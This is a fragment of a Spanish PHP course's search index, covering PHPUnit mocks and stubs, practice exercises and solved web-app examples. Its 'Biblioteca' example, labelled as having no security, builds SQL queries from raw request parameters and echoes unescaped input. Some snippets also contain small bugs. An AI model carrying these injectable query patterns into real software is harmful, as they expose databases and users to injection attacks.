estamos testeando. Cuando un doble de prueba se comporta así, devolviendo valores a lo loco (pero con sentido), se le suele llamar stub. Por ejemplo, si te fijas en el método sacarDosCartas() de la clase Jugador, verás que fallará porque los métodos de Baraja que se usan allí aún no están implementados (cartasDisponibles(), reset(), barajar() o getCarta()). Esto provocará un fallo en el test, pero no es un error de Jugador. Por lo tanto, para probar el funcionamiento del método sacarDosCartas(), usaremos un stub añadiendo en sacarDosCartasTest(), de este modo: . // Test para el método sacarDosCartas() public function sacarDosCartasTest() { $this-&gt;baraja-&gt;method('cartasDisponibles')-&gt;willReturn(40); $this-&gt;baraja-&gt;method('reset'); $this-&gt;baraja-&gt;method('barajar'); $this-&gt;baraja-&gt;method('getCarta')-&gt;willReturn('3-bastos'); // Aquí iría el resto del código del test. } . ¡Y listo! Aunque los métodos cartasDisponibles(), reset() y compañía aún no existan en Baraja, podemos llamarlos en nuestro test y se comportarán como si existieran. De hecho, cartasDisponibles() nos devolverá el valor 40 y getCarta() nos devolverá “3-bastos”, que son valores correctos y perfectamente válidos para hacer nuestras pruebas. El valor que nos devolverá el stub se indica, como puedes ver en el ejemplo, con willReturn(). Por su parte, los métodos reset() y barajar() no devolverán nada, porque realmente no tienen que hacerlo. Dobles de prueba: mocks . A veces, el doble de prueba no puede comportarse de forma tan simplona (devolver siempre el mismo valor para el mismo método), sino que necesitamos “simular” un comportamiento un poco más complejo. Por ejemplo, hacer varias llamadas consecutivas al método y que este nos devuelva valores diferentes cada vez. Cuando un doble de prueba tiene un comportamiento como este último, se denomina mock en lugar de stub. Y el objeto Baraja (que, recuerda, no es un objeto de la clase Baraja real, sino un doble) dispone de muchos métodos para ello, como: . | method(): para indicar qué método vamos a simular. | expects(): para especificar el número de veces que ese método debería ser llamado durante las pruebas. | with(): para especificar los parámetros que se le van a pasar al método en cada llamada. | will(): para especificar los valores que el método devolverá en cada llamada. | . Estos métodos, a su vez, tienen multitud de variantes. Por ejemplo, will() tiene una variante llamada willReturnOnConsecutive(), que permite especificar una lista de valores que el mock devolverá en las sucesivas invocaciones. La lista de posibilidades es realmente grande y aquí no tenemos espacio para verla entera, pero puedes encontrarla en la documentación oficial de PHPUnit. En el siguiente ejemplo, vamos a extender el método sacarDosCartasTest() para que compruebe una de las cosas que tiene que hacer esa función: incrementar los puntos del jugador en caso de que el número de dos cartas consecutivas sea el mismo. Para ello, forzaremos al mock para que nos devuelva unos valores concretos en las sucesivas llamadas. Observa cómo se hace eso usando willReturnOnConsecutive() en el método getCarta() del mock, que ahora devolverá “3-bastos” en la primera llamada y “3-oros” en la segunda. // Test para el método sacarDosCartas() public function sacarDosCartasTest() { $this-&gt;baraja-&gt;method('cartasDisponibles')-&gt;willReturn(40); $this-&gt;baraja-&gt;method('reset'); $this-&gt;baraja-&gt;method('barajar'); $this-&gt;baraja-&gt;method('getCarta')-&gt;willReturnOnConsecutive('3-bastos', '3-oros'); // Aquí iría el resto del código del test. Por ejemplo, vamos a comprobar si // el método sacarDosCartas() incrementa los puntos del jugador cuando salen dos // cartas del mismo número $puntos_ini = $this-&gt;jugador-&gt;getPuntos(); $this-&gt;baraja-&gt;sacarDosCartas(); // Este método llamará dos veces a getCarta() $puntos_fin = $this-&gt;jugador-&gt;getPuntos(); $this-&gt;assertEquals($puntos_fin - $puntos_ini, 1); // Los puntos deberían haberse incrementado en 1 } . El resto de cosas que hubiera que comprobar de sacarDosCartas() se pueden programar también con ayuda de mocks y stubs de la clase Baraja, igual que hemos comprobado que los puntos se incrementan al sacar dos cartas consecutivas del mismo número. Y eso mismo habría que hacerlo con todos los métodos de la clase Jugador. Recuerda que, en la metodología TDD, las pruebas se diseñan ANTES de escribir el código de las clases. Puede parecer engorroso (y, de hecho, lo es) pero el código resultante es muchísimo más robusto. Tal vez el sistema de dobles de prueba de PHPUnit te haya parecido un poco difícil de usar. Es cierto: los dobles de prueba no son la mayor fortaleza de PHPUnit. Existen, por suerte o por desgracia, otras bibliotecas para hacer pruebas basadas completamente en la creación de dobles que tal vez te apetezca explorar, como Mockery o Phake (https://github.com/mlively/phake). Cobertura . La cobertura de los tests es una medida de la cantidad de código que está siendo comprobada por los casos de prueba que hayamos escrito. Una cobertura del 100% no indica necesariamente que hayamos escrito tests para todos los posibles comportamientos de nuestro código o todos los flujos de ejecución, pero sí es un indicador de que nos estamos aproximando a ello. Por el contrario, una cobertura baja siempre nos dice que nuestros casos de prueba son aún muy mejorables. PHPUnit proporciona una herramienta para generar informes muy intuitivos acerca de la cobertura de nuestros tests. Para obtener ese informe en formato HTML, simplemente teclea esto en la consola de Visual Studio Code (o de tu IDE preferido): . $ XDEBUG_MODE = coverage ./vendor/bin/phpunit --coverage-filter test --coverage-html coverage test . Este comando generará una página HTML que se ubicará en el directorio coverage y que puede abrirse con cualquier navegador web. ",
    "url": "https://iescelia.org/docs/dwes/_site/php/tdd.html#26-tdd-test-driven-development",
    "relUrl": "/php/tdd.html#26-tdd-test-driven-development"
  },"13": {
    "doc": "2.6 TDD (test-driven development)",
    "title": "2.6 TDD (test-driven development)",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/tdd.html",
    "relUrl": "/php/tdd.html"
  },"14": {
    "doc": "2.7 Ejercicios propuestos",
    "title": "2.7. Ejercicios propuestos",
    "content": ". | 2.7.1. Ejercicios sin acceso a bases de datos | 2.7.2. Ejercicios con acceso a bases de datos | . Los siguientes son una colección de ejercicios de programación que funcionan exactamente igual que los ejercicios en el gimnasio: para fortalecer tu musculatura como programador o programadora. Está ordenados por orden creciente de complejidad, y no es necesario que los hagas todos. Por ejemplo, si los primeros te resultan demasiado fáciles, salta hasta alguno que suponga algún reto para ti. Por el contrario, si hasta los primeros te cuestan trabajo, deberías ir intentándolos todos o casi todos en orden. También puedes escribir tus propios programas si los que aparecen aquí no te interesan demasiado: siempre es bueno que el programa que estás desarrollando, aunque sea sencillo, te resulte motivador. No te asustes si el programa que intentas escribir parece muy complejo, no llegas a terminarlo o incluso no te funciona en absoluto: todo el tiempo dedicado a programar es tiempo bien aprovechado para un aprendiz de programación. Estos ejercicios requerirán de ti dedicación, esfuerzo y constancia. Como ir al gimnasio, vamos. Pero por eso estás aquí, ¿no es cierto? Y recuerda lo que ya hemos dicho varias veces antes: a programar solo se aprende programando. 2.7.1. Ejercicios sin acceso a bases de datos . Ejercicio 1: positivo, negativo . Diseña un formulario con un campo de texto en el que puedas escribir números. Al pulsar el botón de enviar, debe llamar a un script escrito en PHP que debe decirnos si el número enviado fue positivo, cero o negativo. Ejercicio 2: anagramas . Una palabra es un anagrama de otra si contiene las mismas letras colocadas en orden diferente. Por ejemplo, “CAVA” es un anagrama de “VACA”, y viceversa. El ejercicio consiste en escribir un programa en PHP que pida dos palabras y compruebe si la primera es un anagrama de la segunda. Ejercicio 3: función potencia . Escribe una función PHP que reciba dos parámetros (A y B) y devuelva el valor de la potencia de A elevado a B (AB). Escribe también un programa PHP que haga uso de esa función para calcular potencias. Ejercicio 4: devolución de arrays . Escribe un programa PHP que pida cinco números al usuario y los guarde en un array. Luego debe llamar a una función pasándole el array como parámetro, y la función calculará cuál de los cinco números es el mayor, cuál el menor y cuánto vale la media, devolviendo esos tres valores en otro array. Por último, se mostrarán en la pantalla el mayor, el menor y la media. Ejercicio 5: Simon dice . “Simon dice” es un clásico juego de memoria que consiste en componer secuencias de cuatro colores cada vez más largas, y el jugador tiene que recordarlas y reproducirlas. Puedes encontrar muchas versiones de Simon en internet. Nosotros vamos a construir una versión simplificada que muestre secuencias de números (aunque podríamos hacerlo con colores sólo complicándolo un poco). El programa mostrará un número entre 1 y 4 durante un instante, y luego borrará la pantalla y pedirá al usuario que lo repita. Después mostrará dos números aleatorios entre 1 y 4 (por ejemplo, 3 – 1), y luego el usuario los tendrá que repetir, y así hasta que el usuario falle al introducir los números. 2.7.2. Ejercicios con acceso a bases de datos . Ejercicio 6: videoclub simplificado . En esta sección, en lugar de ejercicios independientes, vamos a plantear una aplicación más larga que iremos montando paso a paso. Al final, tendrás una aplicación web simple pero plenamente funcional: tu primera aplicación web. Importante: puedes (y te aconsejo que así lo hagas) utilizar como base para esta aplicación la Biblioteca que aparecía en la sección de “Ejercicios resueltos”. Conéctate a tu servidor de MySQL con el cliente que prefieras (te recomiendo PhpMyAdmin, que viene de serie con XAMPP) y crea una base de datos vacía a la que debes añadir estas tablas: . | Películas (id#, titulo, genero, pais, anyo, cartel) | Personas (id#, nombre, apellidos, fotografia) | Actúan (idPelicula#, idPersona#) | . Inserta algunos datos en las tablas para que no estén vacías. Las imágenes deben ser cadenas de caracteres con la ruta del archivo que realmente contiene la imagen. Este archivo debe estar almacenado en una subcarpeta de la aplicación (por ejemplo, “images”). A continuación, y utilizando como base el código fuente de la Biblioteca, haz que tu aplicación web sea capaz de: . | Mostrar una lista de las películas que hay en la base de datos (con su reparto). Junto a cada película, debe aparecer dos enlaces con el texto “Modificar” y “Borrar”. Y, antes o después de la lista, debe aparecer un enlace para “Añadir” una película y otro para “Buscar”. | Borrar una película. Se accede a esta funcionalidad desde la lista de películas. | Buscar una película. Se accede a esta funcionalidad desde la lista de películas. | Insertar una película nueva. Se accede a esta funcionalidad desde la lista de películas. No trates de insertar, de momento, el reparto de la película: solo los datos de la tabla “Películas”. | Modificar una película existente. Se accede a esta funcionalidad desde la lista de películas. No modifiques el reparto, solo los datos de la película. | . Programa esas operaciones en ese orden, porque van de la más sencilla a la más complicada de desarrollar, y básate en el caso resuelto “Biblioteca” que vimos en la sección anterior. Ejercicio 7: ampliación indefinida del videoclub . Si terminas antes de tiempo, puedes ir ampliando esta aplicación indefinidamente en varias direcciones: . | Añadir el mantenimiento de la tabla de Personas: búsquedas, inserciones, modificaciones y borrados. | Asignar el reparto a cada película, es decir, hacer inserciones y borrados en la tabla Actuan, tanto al crear una película como al modificarla. | Crear nuevas tablas para relacionar Personas y Películas, de manera que la base de datos pueda contener también las personas que dirigen, escriben o producen las películas, y añadir todo esto a la aplicación. | Incluir enlaces a trailers de cada película en Youtube. | Añadir un sistema de votaciones de los visitantes para cada película. | ¡Y todo lo que se te ocurra! | . ",
    "url": "https://iescelia.org/docs/dwes/_site/php/ejercicios-propuestos.html#27-ejercicios-propuestos",
    "relUrl": "/php/ejercicios-propuestos.html#27-ejercicios-propuestos"
  },"15": {
    "doc": "2.7 Ejercicios propuestos",
    "title": "2.7 Ejercicios propuestos",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/php/ejercicios-propuestos.html",
    "relUrl": "/php/ejercicios-propuestos.html"
  },"16": {
    "doc": "2.8 Ejercicios resueltos",
    "title": "2.8. Ejercicios resueltos",
    "content": ". | 2.8.1. Tabla de multiplicar | 2.8.2. Juego del número secreto | 2.8.3. Biblioteca | . Ya hemos visto muy superficialmente cómo es el lenguaje PHP y cómo se puede acceder desde él a una base de datos externa para almacenar o recuperar información de ella. Ahora nos queda poner eso en práctica antes de poder profundizar más en el desarrollo de aplicaciones web complejas. En esta sección vamos a mostrar algunos ejemplos sencillos de aplicaciones web muy, muy básicas programadas con PHP. La última de ellas incluye un acceso a una base de datos. Mira con detenimiento el código y asegúrate de comprenderlo. Para empezar a programar con PHP, no hay nada mejor que echar un vistazo a algunos programas fáciles que luego puedas utilizar como plantilla para los tuyos. Eso sí, es imprescindible que, después, dediques un tiempo a tratar de escribir tú mismo/a tus propios programas sencillos. Al final de esta sección te propondremos algunos, aunque tú puedes cambiarlos por otros que te apetezcan más. Lo importante es que recuerdes siempre algo que parece obvio pero que, a menudo, la gente olvida: a programar solo puede aprenderse programando. 2.8.1. Tabla de multiplicar . Vamos a escribir un programa en PHP que pida un número al usuario y muestre su tabla de multiplicar hasta el 25 en una tabla HTML de 5 por 5 casillas. El usuario escribirá el número en un formulario HTML. Solución 1: con dos archivos fuente . Esta primera solución la vamos a plantear con dos archivos: . | index.php: contendrá el formulario en el que vamos a pedir al usuario que escriba un número. En el action del formulario, pondremos el nombre del segundo archivo para enviarle el número. | tabla.php: recibirá el número escrito en el formulario y calculará la tabla de multiplicar, escribiendo la salida en formato HTML. | . ARCHIVO index.php . &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Tabla de multiplicar - Versión 1&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action='tabla.php' method='GET'&gt; Introduce un número: &lt;input type='text' name='numero'&gt; &lt;br&gt; &lt;input type='submit'&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; . ARCHIVO tabla.php . &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Tabla de multiplicar - Versión 1&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php // Recuperamos el número escrito en el formulario. $n = $_REQUEST[\"numero\"]; // Mostramos la tabla de multiplicar en una tabla HTML echo \"&lt;table border='1'&gt;\"; echo \"&lt;tr&gt;&lt;td colspan='5'&gt;Tabla de multiplicar del número $n&lt;/td&gt;&lt;/tr&gt;\"; echo \"&lt;tr&gt;\"; for ($i = 1; $i &lt;= 25; $i++) { if (($i-1) % 5 == 0) echo \"&lt;/tr&gt;&lt;tr&gt;\"; echo \"&lt;td&gt;$n x $i = \" . $n * $i . \"&lt;/td&gt;\"; } echo \"&lt;/tr&gt;\"; echo \"&lt;/table&gt;\"; ?&gt; &lt;/body&gt; &lt;/html&gt; . Solución 2: con un solo archivo . Vamos a mejorar la solución anterior uniendo todo el código en un solo archivo, que podemos llamar index.php. Eso signfica que, ahora, en el action del formulario, escribiremos index.php, de modo que, al pulsar submit, el número se enviará al mismo programa. Es decir, index.php se ejecutará dos veces: una para mostrar el formulario y otra para calcular la tabla de multiplicar. Observa como se usa la función isset() para averiguar en cuál de esas dos ejecuciones estamos. Esta función recibe como parámetro una variable y nos dice si esa variable existe o, por el contrario, si no ha sido declarada ni inicializada aún. &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Tabla de multiplicar - Versión 2&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php if (!isset($_REQUEST[\"numero\"])) { // Si no tenemos un número pasado por GET, significa que estamos en la primera ejecución, // así que mostramos el formulario echo \"&lt;form action='index.php' method='GET'&gt; Introduce un número: &lt;input type='text' name='numero'&gt; &lt;br&gt; &lt;input type='submit'&gt; &lt;/form&gt;\"; } else { // Ya tenemos número pasado por GET. Vamos a calcular su tabla de multiplicar. $n = $_REQUEST[\"numero\"]; echo \"&lt;table border='1'&gt;\"; echo \"&lt;tr&gt;&lt;td colspan='5'&gt;Tabla de multiplicar del número $n&lt;/td&gt;&lt;/tr&gt;\"; echo \"&lt;tr&gt;\"; for ($i = 1; $i &lt;= 25; $i++) { if (($i-1) % 5 == 0) echo \"&lt;/tr&gt;&lt;tr&gt;\"; echo \"&lt;td&gt;$n x $i = \" . $n * $i . \"&lt;/td&gt;\"; } echo \"&lt;/tr&gt;\"; echo \"&lt;/table&gt;\"; } ?&gt; &lt;/body&gt; &lt;/html&gt; . 2.8.2. Juego del número secreto . Vamos a escribir una aplicación web en PHP para jugar al juego del número secreto. Es un juego clásico que consiste en lo siguiente: el ordenador elegirá un número al azar entre 1 y 100 y el jugador tendrá que averiguarlo. Cada vez que el jugador haga un intento, la aplicación le indicará si el número secreto es mayor o menor que el número introducido. Cuando el jugador por fin acierte, la aplicación le dará la enhorabuena y le indicará cuántos intentos ha necesitado para averiguar el número secreto. Vamos a ver dos soluciones para este programa. En la primera, utilizaremos las variables de la URL para mantener vivos los datos del programa. En la segunda, utilizaremos variables de sesión para lograr el mismo efecto de forma mucho más limpia. Juego del número secreto: solución sin variables de sesión . Este juego necesita que algunas variables, como el número secreto (variable $aleatorio) o el número de intentos (variable $intentos) persistan entre una solicitud al servidor y la siguiente. Para lograrlo, haremos que el script se envíe a sí mismo el valor de esas variables en la última línea. Supondremos que el archivo se llama index.php. Esta es una solución muy poco elegante, un estilo de programación de aplicaciones web que se dejó de usar hace años, pero que ilustra perfectamente cuál es el primer problema al que nos enfrentamos al desarrollar aplicaciones web: que se ejecutan en el servidor “a tirones”, un trozo cada vez, y para el servidor cada uno de esos trozos es un programa independiente, aunque el usuario tenga la sensación de que forman una aplicación coherente. &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Juego del número secreto&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php // Primero, comprobamos su ya existe la variable \"numero\" en la URL. // Si no existe, significa que el usuario tiene que escribir un número: tenemos que mostrarle el formulario. // Si ya existe, significa que el usuario ha escrito algún número y tenemos que comprobar si coincide con el aleatorio. if (!isset($_REQUEST['numero']])) { // La variable \"numero\" NO existe. Vamos a pedirle que lo escriba en un formulario echo \"&lt;form action='05-numero-secreto.php' method='get'&gt; Adivina mi número: &lt;input type='text' name='numero'&gt;&lt;br&gt; &lt;input type='hidden' name='aleatorio' value='$aleatorio'&gt; &lt;input type='hidden' name='intentos' value='$intentos'&gt; &lt;br&gt; &lt;input type='submit'&gt; &lt;/form&gt;\"; // ¿Y el número aleatorio? Si aún no existe, significa que es LA PRIMERA ejecución y aún tenemos que elegirlo. // En cambio, si ya existe, tendremos que recuperarlo para seguir usando el mismo aleatorio y no uno nuevo cada vez. if (!isset($_REQUEST['aleatorio'])) { $intentos = 0; $aleatorio = rand(1,100); } else { $aleatorio = $_REQUEST['aleatorio']; $intentos = $_REQUEST['intentos']; } } else { // La variable \"numero\" existe. Eso indica que el usuario escribió un número en el formulario. // Vamos a recuperar ese número y a compararlo con el aleatorio. $n = $_REQUEST['numero']; $aleatorio = $_REQUEST['aleatorio']; $intentos = $_REQUEST['intentos']; $intentos++; echo \"Tu número es: $n&lt;br&gt;\"; if ($n &gt; $aleatorio) { echo \"Mi número es MENOR\"; } else if ($n &lt; $aleatorio) { echo \"Mi número es MAYOR\"; } else { echo \"&lt;p&gt;ENHORABUENA, HAS ACERTADO&lt;/p&gt;\"; echo \"Has necesitado $intentos intentos\"; } // Volvemos a llamar a este mismo programa, pasándole como variables de URL el aleatorio // y el número de intentos, para seguir jugando con el mismo número secreto. echo \"&lt;br&gt;&lt;a href='index.php?aleatorio=$aleatorio&amp;intentos=$intentos'&gt;Sigue jugando...&lt;/a&gt;\"; } ?&gt; . Juego del número secreto: solución con variables de sesión . En esta solución, se ha sustituido la chapuza de las variables pasadas por URL por variables de sesión. Aunque las veremos con más detalle en el siguiente tema, te puedo adelantar que las variables de sesión permiten almacenar datos persistentes entre sucesivas ejecuciones de scripts desde el mismo cliente. Es decir, el servidor recuerda el valor de determinadas variables para que ese programa ejecutado a tirones se comporte como un todo unificado de cara al usuario. Observa detenidamente cómo se usan las variables de sesión con PHP mediante el array global $_SESSION para obtener una solución más elegante que la anterior. &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Juego del número secreto&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php session_start(); // Para poder usar variables de sesión if (!isset($_REQUEST['numero'])) { // NO existe la variable número: vamos a mostrar el formulario echo \"&lt;form action='05-numero-secreto-v2.php' method='get'&gt; Adivina mi número: &lt;input type='text' name='numero'&gt;&lt;br&gt; &lt;br&gt; &lt;input type='submit'&gt; &lt;/form&gt;\"; // ¿Será la primera ejecución? Vamos a ver si ya existe la variable \"aleatorio\". // Si no existe, la creamos, pero esta vez como variable de sesión, no de URL. // Esa variable quedará almacenada en el servidor y seguirá existiendo hasta que // cerremos la sesión. if (!isset($_SESSION['aleatorio'])) { $_SESSION['aleatorio'] = rand(1,100); $_SESSION['intentos'] = 0; } } else { // Existe la variable \"numero\": significa que el usuario rellenó el formulario y pulsó \"submit\". // Vamos a compararla con el aleatorio. // Guardaremos \"numero\" y \"aleatorio\" en variable locales // para manejarlas con más comodidad, pero no es imprescindible hacerlo. $n = $_REQUEST['numero']; $aleatorio = $_SESSION['aleatorio']; $_SESSION['intentos']++; echo \"Tu número es: $n&lt;br&gt;\"; if ($n &gt; $aleatorio) { echo \"Mi número es MENOR\"; echo \"&lt;br&gt;&lt;a href='index.php'&gt;Sigue jugando...&lt;/a&gt;\"; } else if ($n &lt; $aleatorio) { echo \"Mi número es MAYOR\"; echo \"&lt;br&gt;&lt;a href='index.php'&gt;Sigue jugando...&lt;/a&gt;\"; } else { echo \"&lt;p&gt;ENHORABUENA, HAS ACERTADO&lt;/p&gt;\"; echo \"Has necesitado \".$_SESSION['intentos'].\" intentos\"; unset($_SESSION['aleatorio']); // Esto destruye la variable de sesión echo \"&lt;br&gt;&lt;a href='index.php'&gt;Jugar de nuevo&lt;/a&gt;\"; } } ?&gt; &lt;/body&gt; &lt;/html&gt; . 2.8.3. Biblioteca . Este es un caso práctico muy importante por dos razones: . | Porque es nuestra primera aplicación web “de verdad”, con una base de datos detrás. | Porque volveremos sobre ella varias veces a lo largo de las siguientes secciones para hacerle sucesivas mejoras, hasta dejarla presentable. | . El código fuente es más largo, pero fácil de seguir. No te desesperes ni intentes leerlo en dos minutos para marcharte a hacer otra cosa. Tómatelo con calma, como si leer el código fuente fuera como leer un manual de instrucciones de un electrodoméstico nuevo que aún no tienes ni idea de cómo se usa. Se trata de escribir una aplicación web en PHP que gestione, de forma muy simplificada, una biblioteca. La aplicación trabajará con una base de datos compuesta de solo dos tablas (ya te dije que estaría muy simplificada): libros y autores. Esta aplicación nos permitirá, en principio, ver la lista de todos los libros disponibles, así como dar de alta libros nuevos y modificar o borrar los libros existentes. De momento no trabajaremos con los autores, pero sería fácil extenderla para que también nos dejase hacer altas, bajas y modificaciones de los autores. Al leer el código, observa cómo utilizamos una variable muy especial llamada $action para saber qué tiene que hacer la aplicación en cada momento. Esa variable es el germen de la arquitectura modelo-vista-controlador con la que trabajaremos una y otra vez más adelante. &lt;!-- BIBLIOTECA VERSIÓN 1 Características de esta versión: - Código monolítico (sin arquitectura MVC) - Sin seguridad - Sin sesiones ni control de acceso - Sin reutilización de código --&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"es\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $db = new mysqli(\"servidor-de-base-de-datos\", \"usuario\", \"password\", \"nombre-base-de-datos\"); // Miramos el valor de la variable \"action\", si existe. Si no, le asignamos una acción por defecto if (isset($_REQUEST[\"action\"])) { $action = $_REQUEST[\"action\"]; } else { $action = \"mostrarListaLibros\"; // Acción por defecto } // CONTROL DE FLUJO PRINCIPAL // El programa saltará a la sección del switch indicada por la variable \"action\" switch ($action) { // --------------------------------- MOSTRAR LISTA DE LIBROS ---------------------------------------- case \"mostrarListaLibros\": echo \"&lt;h1&gt;Biblioteca&lt;/h1&gt;\"; // Buscamos todos los libros de la biblioteca if ($result = $db-&gt;query(\"SELECT * FROM libros INNER JOIN escriben ON libros.idLibro = escriben.idLibro INNER JOIN personas ON escriben.idPersona = personas.idPersona ORDER BY libros.titulo\")) { // La consulta se ha ejecutado con éxito. Vamos a ver si contiene registros if ($result-&gt;num_rows != 0) { // La consulta ha devuelto registros: vamos a mostrarlos // Primero, el formulario de búsqueda echo \"&lt;form action='index.php'&gt; &lt;input type='hidden' name='action' value='buscarLibros'&gt; &lt;input type='text' name='textoBusqueda'&gt; &lt;input type='submit' value='Buscar'&gt; &lt;/form&gt;&lt;br&gt;\"; // Ahora, la tabla con los datos de los libros echo \"&lt;table border ='1'&gt;\"; while ($fila = $result-&gt;fetch_object()) { echo \"&lt;tr&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;titulo . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;genero . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;numPaginas . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;nombre . \"&lt;/td&gt;\"; echo \"&lt;td&gt;\" . $fila-&gt;apellido . \"&lt;/td&gt;\"; echo \"&lt;td&gt;&lt;a href='index.php?action=formularioModificarLibro&amp;idLibro=\" . $fila-&gt;idLibro . \"'&gt;Modificar&lt;/a&gt;&lt;/td&gt;\"; echo \"&lt;td&gt;&lt;a href='index.php?action=borrarLibro&amp;idLibro=\" . $fila-&gt;idLibro . \"'&gt;Borrar&lt;/a&gt;&lt;/td&gt;\"; echo \"&lt;/tr&gt;\"; } echo \"&lt;/table&gt;\"; } else { // La consulta no contiene registros echo \"No se encontraron datos\"; } } else { // La consulta ha fallado echo \"Error al tratar de recuperar los datos de la base de datos. Por favor, inténtelo más tarde\"; } echo \"&lt;p&gt;&lt;a href='index.php?action=formularioInsertarLibros'&gt;Nuevo&lt;/a&gt;&lt;/p&gt;\"; break; // --------------------------------- FORMULARIO ALTA DE LIBROS ---------------------------------------- case \"formularioInsertarLibros\": echo \"&lt;h1&gt;Modificación de libros&lt;/h1&gt;\"; // Creamos el formulario con los campos del libro echo \"&lt;form action = 'index.php' method = 'get'&gt; Título:&lt;input type='text' name='titulo'&gt;&lt;br&gt; Género:&lt;input type='text' name='genero'&gt;&lt;br&gt; País:&lt;input type='text' name='pais'&gt;&lt;br&gt; Año:&lt;input type='text' name='ano'&gt;&lt;br&gt; Número de páginas:&lt;input type='text' name='numPaginas'&gt;&lt;br&gt;\"; // Añadimos un selector para el id del autor o autores $result = $db-&gt;query(\"SELECT * FROM personas\"); echo \"Autores: &lt;select name='autor[]' multiple='true'&gt;\"; while ($fila = $result-&gt;fetch_object()) { echo \"&lt;option value='\" . $fila-&gt;idPersona . \"'&gt;\" . $fila-&gt;nombre . \" \" . $fila-&gt;apellido . \"&lt;/option&gt;\"; } echo \"&lt;/select&gt;\"; echo \"&lt;a href='index.php?action=formularioInsertarAutores'&gt;Añadir nuevo&lt;/a&gt;&lt;br&gt;\"; // Finalizamos el formulario echo \" &lt;input type='hidden' name='action' value='insertarLibro'&gt; &lt;input type='submit'&gt; &lt;/form&gt;\"; echo \"&lt;p&gt;&lt;a href='index.php'&gt;Volver&lt;/a&gt;&lt;/p&gt;\"; break; // --------------------------------- INSERTAR LIBROS ---------------------------------------- case \"insertarLibro\": echo \"&lt;h1&gt;Alta de libros&lt;/h1&gt;\"; // Vamos a procesar el formulario de alta de libros // Primero, recuperamos todos los datos del formulario $titulo = $_REQUEST[\"titulo\"]; $genero = $_REQUEST[\"genero\"]; $pais = $_REQUEST[\"pais\"]; $ano = $_REQUEST[\"ano\"]; $numPaginas = $_REQUEST[\"numPaginas\"]; $autores = $_REQUEST[\"autor\"]; // Lanzamos el INSERT contra la BD. echo \"INSERT INTO libros (titulo,genero,pais,ano,numPaginas) VALUES ('$titulo','$genero', '$pais', '$ano', '$numPaginas')\"; $db-&gt;query(\"INSERT INTO libros (titulo,genero,pais,ano,numPaginas) VALUES ('$titulo','$genero', '$pais', '$ano', '$numPaginas')\"); if ($db-&gt;affected_rows == 1) { // Si la inserción del libro ha funcionado, continuamos insertando en la tabla \"escriben\" // Tenemos que averiguar qué idLibro se ha asignado al libro que acabamos de insertar $result = $db-&gt;query(\"SELECT MAX(idLibro) AS ultimoIdLibro FROM libros\"); $idLibro = $result-&gt;fetch_object()-&gt;ultimoIdLibro; // Ya podemos insertar todos los autores junto con el libro en \"escriben\" foreach ($autores as $idAutor) { $db-&gt;query(\"INSERT INTO escriben(idLibro, idPersona) VALUES('$idLibro', '$idAutor')\"); } echo \"Libro insertado con éxito\"; } else { // Si la inserción del libro ha fallado, mostramos mensaje de error echo \"Ha ocurrido un error al insertar el libro. Por favor, inténtelo más tarde.\"; } echo \"&lt;p&gt;&lt;a href='index.php'&gt;Volver&lt;/a&gt;&lt;/p&gt;\"; break; // --------------------------------- BORRAR LIBROS ---------------------------------------- case \"borrarLibro\": echo \"&lt;h1&gt;Borrar libros&lt;/h1&gt;\"; // Recuperamos el id del libro y lanzamos el DELETE contra la BD $idLibro = $_REQUEST[\"idLibro\"]; $db-&gt;query(\"DELETE FROM libros WHERE idLibro = '$idLibro'\"); // Mostramos mensaje con el resultado de la operación if ($db-&gt;affected_rows == 0) { echo \"Ha ocurrido un error al borrar el libro. Por favor, inténtelo de nuevo\"; } else { echo \"Libro borrado con éxito\"; } echo \"&lt;p&gt;&lt;a href='index.php'&gt;Volver&lt;/a&gt;&lt;/p&gt;\"; break; // --------------------------------- FORMULARIO MODIFICAR LIBROS ---------------------------------------- case \"formularioModificarLibro\": echo \"&lt;h1&gt;Modificación de libros&lt;/h1&gt;\"; // Recuperamos el id del libro que vamos a modificar y sacamos el resto de sus datos de la BD $idLibro = $_REQUEST[\"idLibro\"]; $result = $db-&gt;query(\"SELECT * FROM libros WHERE libros.idLibro = '$idLibro'\"); $libro = $result-&gt;fetch_object(); // Creamos el formulario con los campos del libro // y lo rellenamos con los datos que hemos recuperado de la BD echo \"&lt;form action = 'index.php' method = 'get'&gt; &lt;input type='hidden' name='idLibro' value='$idLibro'&gt; Título:&lt;input type='text' name='titulo' value='$libro-&gt;titulo'&gt;&lt;br&gt; Género:&lt;input type='text' name='genero' value='$libro-&gt;genero'&gt;&lt;br&gt; País:&lt;input type='text' name='pais' value='$libro-&gt;pais'&gt;&lt;br&gt; Año:&lt;input type='text' name='ano' value='$libro-&gt;ano'&gt;&lt;br&gt; Número de páginas:&lt;input type='text' name='numPaginas' value='$libro-&gt;numPaginas'&gt;&lt;br&gt;\"; // Vamos a añadir un selector para el id del autor o autores. // Para que salgan preseleccionados los autores del libro que estamos modificando, vamos a buscar // también a esos autores. $todosLosAutores = $db-&gt;query(\"SELECT * FROM personas\"); // Obtener todos los autores $autoresLibro = $db-&gt;query(\"SELECT idPersona FROM escriben WHERE idLibro = '$idLibro'\"); // Obtener solo los autores del libro que estamos buscando // Vamos a convertir esa lista de autores del libro en un array de ids de personas $listaAutoresLibro = array(); while ($autor = 